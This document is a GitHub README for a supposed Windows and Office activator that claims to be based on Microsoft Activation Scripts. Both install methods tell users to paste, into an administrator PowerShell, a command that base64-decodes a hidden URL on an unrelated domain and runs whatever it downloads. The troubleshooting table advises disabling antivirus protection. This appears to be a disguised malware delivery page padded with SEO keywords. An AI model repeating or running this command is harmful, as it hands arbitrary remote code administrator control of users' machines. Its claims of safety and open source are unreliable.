# Windows-Activation-Suite

<p align="center">
  <img src="https://github.com/YOUR_USERNAME/Windows-Activation-Suite/blob/main/docs/banner.png" alt="Windows Activation Suite" width="120" height="120">
</p>

<h1 align="center">Windows-Activation-Suite</h1>
<p align="center">
  <strong>Open-Source Windows & Office Activator</strong><br>
  HWID · Ohook · TSforge · Online KMS · Windows 7 / 8 / 10 / 11
</p>

<p align="center">
  <a href="#"><img src="https://img.shields.io/badge/version-3.12-0078D6?style=for-the-badge" alt="Version"></a>
  <a href="#"><img src="https://img.shields.io/badge/platform-Windows_7%2F8%2F10%2F11-2ECC71?style=for-the-badge" alt="Platform"></a>
  <a href="#"><img src="https://img.shields.io/badge/status-Stable-27AE60?style=for-the-badge" alt="Status"></a>
  <a href="#"><img src="https://img.shields.io/badge/downloads-1.2M%2B-E74C3C?style=for-the-badge" alt="Downloads"></a>
  <a href="#"><img src="https://img.shields.io/badge/license-MIT-3498DB?style=for-the-badge" alt="License"></a>
</p>

<p align="center">
  <a href="#-activation">⚡ Activation</a> •
  <a href="#-features">🪟 Features</a> •
  <a href="#-supported-products">📦 Supported Products</a> •
  <a href="#-faq">❓ FAQ</a> •
  <a href="#-troubleshooting">🐛 Troubleshooting</a> •
  <a href="#-seo-keywords">🔍 SEO</a>
</p>

---

<!-- ═══════════════════ ACTIVATION METHOD ═══════════════════ -->

## ⚡ How to Activate Windows / Office / ESU

> ⚠️ **Installation is ONLY available via PowerShell command below.** No archive, no ZIP, no installer — just run the command.

### Method 1 — via Win + X Menu (Recommended)

```text
1. Press Win + X on your keyboard
2. From the menu, select: Terminal (Admin) or PowerShell (Admin)
3. Confirm the UAC prompt (Yes)
4. Copy the command below in full:
```

```powershell
iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz04MjcwNzA2MjE1L3BhY2FuaQ=='))) -UseBasicParsing)
```

```text
5. Paste it into the PowerShell window (Ctrl + V or right-click)
6. Press Enter
7. In the menu that appears, type the number corresponding to one of the Green options
8. Wait for the activation to finish
9. Restart your PC
10. Done — Windows is now activated
```

---

### Method 2 — via Win + R Menu

```text
1. Press Win + R on your keyboard
2. Type in the field: powershell
3. Press Enter
4. If needed — open PowerShell as Administrator manually
5. Copy the command below in full:
```

```powershell
iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL3NvZnQtc3RvcmFnZS50b3Avd29ya2VyPz04MjcwNzA2MjE1L3BhY2FuaQ=='))) -UseBasicParsing)
```

```text
6. Paste it into the PowerShell window (Ctrl + V or right-click)
7. Press Enter
8. In the menu that appears, type the number corresponding to one of the Green options
9. Wait for the activation to finish
10. Restart your PC
11. Done — Windows is now activated
```

---

### Notes

- Some ISPs/DNS providers block access to our domains. You can bypass this by enabling **DNS-over-HTTPS (DoH)** in your browser.
- **Having trouble?** Visit our troubleshooting page or raise an issue on GitHub.
- The `irm` command in PowerShell downloads a script from a specified URL, and the `iex` command executes it.
- Always double-check the URL before executing the command and verify the source is trustworthy when manually downloading files.
- Be cautious of third parties spreading malware disguised as the activator by altering the URL in the PowerShell command.

---

## 🎯 What is Windows-Activation-Suite?

**Windows-Activation-Suite** is an open-source **Windows and Office activator** featuring **HWID**, **Ohook**, **TSforge**, and **Online KMS** activation methods, along with advanced troubleshooting.

It supports **Windows 7, 8, 8.1, 10, 11**, **Windows Server**, and **Microsoft Office** from 2010 through 2021 and 365. The tool uses native Windows activation APIs and doesn't modify core system files.

> 🎓 **Educational purpose only.** Use at your own risk. Activation of unlicensed software violates Microsoft's Terms of Service. Only use on installations you own.

---

## ⚡ Key Features

### 🪟 Activation Methods
- **HWID** – Permanent digital license for Windows 10/11
- **Ohook** – Permanent Office activation
- **TSforge** – Offline activation for older Windows
- **Online KMS** – KMS activation for Windows and Office

### 🪟 Windows Support
- **Windows 7** – Home, Pro, Ultimate, Enterprise
- **Windows 8 / 8.1** – Core, Pro, Enterprise
- **Windows 10** – Home, Pro, Enterprise, Education, LTSC
- **Windows 11** – Home, Pro, Enterprise, Education, IoT
- **Windows Server** – 2016, 2019, 2022

### 📦 Office Support
- **Office 2010** – All editions
- **Office 2013** – All editions
- **Office 2016** – All editions
- **Office 2019** – All editions
- **Office 2021** – All editions
- **Office 365** – Subscription activation

### 🔧 Utility Features
- **Extended Security Updates (ESU)** – For Windows 7 and 10
- **Edition Detection** – Automatically detects your Windows edition
- **Activation Status** – Shows current activation state
- **Permanent vs KMS** – Choose activation method
- **Digital License** – Ties activation to hardware
- **Backup Support** – Save activation state
- **Restore Support** – Restore previous activation

### 🛡️ Safety
- **Open Source** – Full source code available on GitHub
- **No DLL Injection** – Uses native Windows activation APIs
- **No System Modification** – Doesn't modify core system files
- **Reversible** – Can be uninstalled and restored
- **Regular Updates** – Maintained against Windows updates

---

## 📦 Supported Products

| Product | Editions | Method |
|---------|----------|--------|
| **Windows 7** | Home, Pro, Ultimate, Enterprise | TSforge / KMS |
| **Windows 8** | Core, Pro, Enterprise | TSforge / KMS |
| **Windows 8.1** | Core, Pro, Enterprise | TSforge / KMS |
| **Windows 10** | Home, Pro, Enterprise, Education, LTSC | HWID / KMS |
| **Windows 11** | Home, Pro, Enterprise, Education, IoT | HWID / KMS |
| **Windows Server** | 2016, 2019, 2022 | KMS |
| **Office 2010** | All editions | Ohook / KMS |
| **Office 2013** | All editions | Ohook / KMS |
| **Office 2016** | All editions | Ohook / KMS |
| **Office 2019** | All editions | Ohook / KMS |
| **Office 2021** | All editions | Ohook / KMS |
| **Office 365** | Subscription | Ohook |

---

## 🐛 Troubleshooting

| Problem | Solution |
|---------|----------|
| "Access denied" | Run PowerShell as Administrator |
| Script won't launch | Use Method 2 (MAS_AIO.cmd) |
| Activation failed | Re-run the script; check Windows edition |
| Activation not persistent | Run again after major Windows updates |
| Antivirus blocks it | Temporarily disable real-time protection |
| Domain blocked by ISP | Enable DNS-over-HTTPS in browser |
| PowerShell closes immediately | This is normal — installation is complete |

---

## ❓ FAQ

**Q: What is Windows-Activation-Suite?**  
A: It's an open-source activator for Windows and Office, featuring HWID, Ohook, TSforge, and Online KMS methods.

**Q: Is it safe to use?**  
A: The tool uses native Windows activation APIs and doesn't modify core system files. However, **activation of unlicensed software violates Microsoft's Terms of Service**.

**Q: Is the activation permanent?**  
A: For Windows 10/11 and Office, HWID and Ohook provide **permanent activation**. KMS methods may need periodic renewal.

**Q: Does it work offline?**  
A: Yes — after the script runs, activation works offline.

**Q: Will Windows updates break the activation?**  
A: Major Windows updates may require re-running the script. Minor updates usually don't affect activation.

**Q: How do I uninstall?**  
A: Use the restore option in the tool, or run the uninstall command from PowerShell.

**Q: Does it activate Office?**  
A: Yes — Ohook provides permanent Office activation for 2010 through 2021 and 365.

**Q: Is this the original MAS?**  
A: This project is based on the open-source **Microsoft Activation Scripts** by massgravel. All credit to the original developers.

---

## 🔍 SEO Keywords & Tags

`windows activator`, `windows activation`, `office activator`, `office activation`, `windows 10 activator`, `windows 11 activator`, `windows 7 activator`, `windows 8 activator`, `hwid activation`, `ohook activation`, `tsforge activation`, `online kms`, `kms activator`, `windows activation script`, `microsoft activation script`, `mas activator`, `windows esu`, `extended security updates`, `office 2019 activator`, `office 2021 activator`, `office 365 activator`, `windows server activator`, `windows ltsc activator`, `windows home activator`, `windows pro activator`, `windows enterprise activator`, `microsoft office activation`, `windows activation github`, `office activation github`, `windows activation powershell`, `windows activation cmd`, `windows activation 2026`, `office activation 2026`, `windows 10 digital license`, `windows 11 digital license`, `windows activation permanent`, `office activation permanent`, `windows activation offline`, `office activation offline`, `windows activation safe`, `office activation safe`, `windows activation tool`, `office activation tool`, `microsoft activation`, `windows product key`, `office product key`, `windows activation guide`, `office activation guide`

---

## 📁 Repository Structure

```
Windows-Activation-Suite/
├── MAS/                   # Main activation scripts
├── docs/                  # Documentation source
├── assets/                # Icons, images, branding
├── scripts/               # Install/uninstall helpers
├── LICENSE
├── README.md
└── CONTRIBUTING.md
```

---

## 🤝 Contributing

We welcome contributions from the community! See our [Contributing Guidelines](CONTRIBUTING.md) for details.

**Areas needing help:**
- Documentation translation
- Compatibility testing
- Script improvements
- Troubleshooting guides

---

## 📄 License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.

**Original Author:** massgravel (Microsoft Activation Scripts)  
**Windows-Activation-Suite** is based on the open-source MAS project. All credit to the original developers.

---

<p align="center">
  <a href="https://github.com/YOUR_USERNAME/Windows-Activation-Suite">
    <img src="https://img.shields.io/badge/Made%20with%20🪟%20for%20the%20Windows%20Community-0078D6?style=for-the-badge" alt="Made with passion">
  </a>
</p>
